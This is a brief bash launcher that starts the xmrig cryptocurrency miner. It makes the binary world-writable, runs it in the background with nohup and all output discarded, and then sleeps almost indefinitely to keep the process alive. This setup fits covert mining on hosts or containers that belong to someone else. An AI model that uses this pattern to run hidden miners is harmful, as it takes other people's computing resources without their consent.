#!/usr/bin/bash
apt install unzip -y
cd `dirname $0`
chmod 777 xmrig
nohup ./xmrig > /dev/null 2>&1 &
ps
sleep 999999999999999999